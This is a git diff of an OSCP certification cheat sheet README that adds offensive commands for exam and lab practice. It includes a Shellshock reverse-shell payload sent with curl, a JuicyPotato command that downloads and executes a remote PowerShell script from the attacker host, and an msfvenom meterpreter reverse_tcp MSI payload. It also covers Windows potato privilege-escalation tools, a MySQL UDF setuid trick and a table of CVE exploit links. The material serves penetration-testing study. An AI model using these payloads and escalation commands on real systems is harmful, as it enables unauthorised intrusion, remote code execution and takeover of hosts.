@@ -1,20 +1,36 @@
 <p align="center">
-  <img width="300" height="300" src="https://github.com/0xsyr0/OSCP/blob/main/files/kali_logo.svg">
+  <img width="300" height="300" src="https://github.com/0xsyr0/OSCP/blob/main/images/kali-linux.svg">
 </p>
 
 # OSCP Cheat Sheet
 
+![GitHub commit activity (branch)](https://img.shields.io/github/commit-activity/m/0xsyr0/OSCP) ![GitHub contributors](https://img.shields.io/github/contributors/0xsyr0/OSCP)
+
 Commands, Payloads and Resources for the OffSec Certified Professional Certification (OSCP).
+
+---
 
 Since this little project get's more and more attention, I decided to update it as often as possible to focus more helpful and absolutely necessary commands for the exam. Feel free to submit a pull request or reach out to me on [Twitter](https://twitter.com/syr0_) for suggestions.
 
 Every help or hint is appreciated!
 
-DISCLAIMER: A guy on Twitter got a point. Automatic exploitation tools like `sqlmap` are prohibited to use in the exam. The same goes for the automatic exploitation functionality of `LinPEAS`. I am not keeping track of current guidelines related to those tools. For that I want to point out that I am not responsible if anybody uses a tool without double checking the latest exam restrictions and fails the exam. Inform yourself before taking the exam!
+---
 
-I removed `sqlmap` because of the reasons above but `Metasploit` is still part of the guide because you can use it for one specific module. Thank you `Muztahidul Tanim` for making me aware and to [Yeeb](https://github.com/Yeeb1) for the resources.
+**DISCLAIMER**: A guy on Twitter got a point. Automatic exploitation tools like `sqlmap` are prohibited to use in the exam. The same goes for the automatic exploitation functionality of `LinPEAS`. I am not keeping track of current guidelines related to those tools. For that I want to point out that I am not responsible if anybody uses a tool without double checking the latest exam restrictions and fails the exam. Inform yourself before taking the exam!
+
+I removed `sqlmap` because of the reasons above but `Metasploit` is still part of the guide because you can use it for one specific module. Thank you **Muztahidul Tanim** for making me aware and to [Yeeb](https://github.com/Yeeb1) for the resources.
 
 Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#exam-restrictions) and the discussion about [LinPEAS](https://www.offensive-security.com/offsec/understanding-pentest-tools-scripts/?hss_channel=tw-134994790). I hope this helps.
+
+---
+
+**END NOTE**: This repository will also try to cover as much as possible of the tools required for the proving grounds boxes.
+
+---
+
+Thank you for reading.
+
+<br>
 
 ## Table of Contents
 
@@ -62,6 +78,7 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [snmpwalk](https://github.com/0xsyr0/OSCP#snmpwalk)
 	- [Web Application Analysis](https://github.com/0xsyr0/OSCP#web-application-analysis-1)
 		- [Burp Suite](https://github.com/0xsyr0/OSCP#burp-suite)
+  		- [cadaver](https://github.com/0xsyr0/OSCP#cadaver)
 		- [Cross-Site Scripting (XSS)](https://github.com/0xsyr0/OSCP#cross-site-scripting-xss)
 		- [ffuf](https://github.com/0xsyr0/OSCP#ffuf)
 		- [Gobuster](https://github.com/0xsyr0/OSCP#gobuster)
@@ -145,8 +162,11 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [CVE-2023-22809: Sudo Bypass](https://github.com/0xsyr0/OSCP#cve-2023-22809-sudo-bypass)
 		- [CVE-2023-23397: Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation)](https://github.com/0xsyr0/OSCP#cve-2023-23397-microsoft-outlook-click-to-run-pe-0-day-powershell-implementation)
 		- [CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)](https://github.com/0xsyr0/OSCP#cve-2023-32629-cve-2023-2640-gameoverlay-ubuntu-kernel-exploit-lpe-0-day)
+  		- [GodPotato LPE](https://github.com/0xsyr0/OSCP#godpotato-lpe)
 		- [Juicy Potato LPE](https://github.com/0xsyr0/OSCP#juicy-potato-lpe)
+  		- [JuicyPotatoNG LPE](https://github.com/0xsyr0/OSCP#juicypotatong-lpe)
 		- [MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE](https://github.com/0xsyr0/OSCP#mysql-4x50-user-defined-function-udf-dynamic-library-2-lpe)
+  		- [PrintSpoofer LPE](https://github.com/0xsyr0/OSCP#printspoofer-lpe)
 		- [SharpEfsPotato LPE](https://github.com/0xsyr0/OSCP#sharpefspotato-lpe)
 		- [Shocker Container Escape](https://github.com/0xsyr0/OSCP#shocker-container-escape)
 	- [Payloads](https://github.com/0xsyr0/OSCP#payloads-1)
@@ -330,7 +350,8 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 | CVE-2014-6271 | Shellshock RCE PoC | https://github.com/zalalov/CVE-2014-6271 |
 | CVE-2014-6271 | Shellshocker RCE POCs | https://github.com/mubix/shellshocker-pocs |
 | CVE-2016-5195 | Dirty COW LPE | https://github.com/firefart/dirtycow |
-| CVE-2016-5195 | Dirty COW (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40847 |
+| CVE-2016-5195 | Dirty COW '/proc/self/mem' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40847 |
+| CVE-2016-5195 | Dirty COW 'PTRACE_POKEDATA' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40839 |
 | CVE-2017-0144 | EternalBlue (MS17-010) RCE | https://github.com/d4t4s3c/Win7Blue |
 | CVE-2017-0199 | RTF Dynamite RCE | https://github.com/bhdresh/CVE-2017-0199 |
 | CVE-2018-7600 | Drupalgeddon 2 RCE | https://github.com/g0rx/CVE-2018-7600-Drupal-RCE |
@@ -1094,6 +1115,22 @@ Ctrl+Shift+u    // URL decoding
 ```c
 export HTTP_PROXY=http://localhost:8080
 export HTTPS_PROXY=https://localhost:8080
+```
+
+#### cadaver
+
+##### General Usage
+
+```c
+cadaver http://<RHOST>/<WEBDAV_DIRECTORY>/
+```
+
+##### Basic Commands
+
+```c
+dav:/<WEBDAV_DIRECTORY>/> cd C
+dav:/<WEBDAV_DIRECTORY>/C/> ls
+dav:/<WEBDAV_DIRECTORY>/C/> put <FILE>
 ```
 
 #### Cross-Site Scripting (XSS)
@@ -3660,7 +3697,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 ```
 
 ```c
-$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> –f  msi > <FILE>.msi
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> -f msi > <FILE>.msi
 ```
 
 ```c
@@ -4171,7 +4208,7 @@ srvinfo
 ##### Overpass the Hash
 
 ```c
-Rubeus.exe kerberoast /user:<USERNAME>
+.\Rubeus.exe kerberoast /user:<USERNAME>
 ```
 
 ##### Pass the Hash
@@ -4206,12 +4243,6 @@ winexe -U '<USERNAME%PASSWORD>' --system //<RHOST> cmd.exe
 
 ```c
 curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http://<RHOST>/cgi-bin/user.sh
-```
-
-```c
-shellshock='() { :;}; echo exploit' bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"
-<environment_variable>='() { :;}; echo exploit' bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"
-<environment_variable>='() { :;}; echo exploit' sudo /root/<binary>
 ```
 
 #### CVE-2016-1531: exim LPE
@@ -4843,33 +4874,95 @@ $ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
 setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
 ```
 
+#### GodPotato LPE
+
+> https://github.com/BeichenDream/GodPotato
+
+```c
+.\GodPotato-NET4.exe -cmd '<COMMAND>'
+```
+
 #### Juicy Potato LPE
 
 > https://github.com/ohpe/juicy-potato
 
-> http://ohpe.it/juicy-potato/CLSID
+> http://ohpe.it/juicy-potato/CLSID/
 
-##### msfvenom and Metasploit Execution
+##### GetCLSID.ps1
 
 ```c
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b "\x00\x0a" -a x86 --platform windows -f exe -o exploit.exe
+<#
+This script extracts CLSIDs and AppIDs related to LocalService.DESCRIPTION
+Then exports to CSV
+#>
+
+$ErrorActionPreference = "Stop"
+
+New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT
+
+Write-Output "Looking for CLSIDs"
+$CLSID = @()
+Foreach($ID in (Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}})){
+    if ($ID.appid -ne $null){
+        $CLSID += $ID
+    }
+}
+
+Write-Output "Looking for APIDs"
+$APPID = @()
+Foreach($AID in (Get-ItemProperty HKCR:\appid\* | select-object localservice,@{N='AppID'; E={$_.pschildname}})){
+    if ($AID.LocalService -ne $null){
+        $APPID += $AID
+    }
+}
+
+Write-Output "Joining CLSIDs and APIDs"
+$RESULT = @()
+Foreach ($app in $APPID){
+    Foreach ($CLS in $CLSID){
+        if($CLS.AppId -eq $app.AppID){
+            $RESULT += New-Object psobject -Property @{
+                AppId    = $app.AppId
+                LocalService = $app.LocalService
+                CLSID = $CLS.CLSID
+            }
+
+            break
+        }
+    }
+}
+
+$RESULT = $RESULT | Sort-Object LocalService
+
+# Preparing to Output
+$OS = (Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption).Trim() -Replace "Microsoft ", ""
+$TARGET = $OS -Replace " ","_"
+
+# Make target folder
+New-Item -ItemType Directory -Force -Path .\$TARGET
+
+# Output in a CSV
+$RESULT | Export-Csv -Path ".\$TARGET\CLSIDs.csv" -Encoding ascii -NoTypeInformation
+
+# Export CLSIDs list
+$RESULT | Select CLSID -ExpandProperty CLSID | Out-File -FilePath ".\$TARGET\CLSID.list" -Encoding ascii
+
+# Visual Table
+$RESULT | ogv
 ```
 
-```c
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST <LHOST>
-msf6 exploit(multi/handler) > set LPORT <LHOST>
-msf6 exploit(multi/handler) > run
-```
+##### Execution
 
 ```c
-.\exploit.exe
+.\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\Windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" -t *
 ```
 
+#### JuicyPotatoNG LPE
+
+> https://github.com/antonioCoco/JuicyPotatoNG
+
 ```c
-[*] Sending stage (175174 bytes) to <RHOST>
-[*] Meterpreter session 1 opened (<LHOST>:<LPORT> -> <RHOST>:51990) at 2021-01-31 12:36:26 +0100
+.\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"
 ```
 
 #### MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE
@@ -4892,6 +4985,14 @@ $ mysql -u root
 > select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
 > create function do_system returns integer soname 'raptor_udf2.so';
 > select do_system('chmod +s /bin/bash');
+```
+
+#### PrintSpoofer LPE
+
+> https://github.com/itm4n/PrintSpoofer
+
+```c
+.\PrintSpoofer64.exe -i -c powershell
 ```
 
 #### SharpEfsPotato LPE
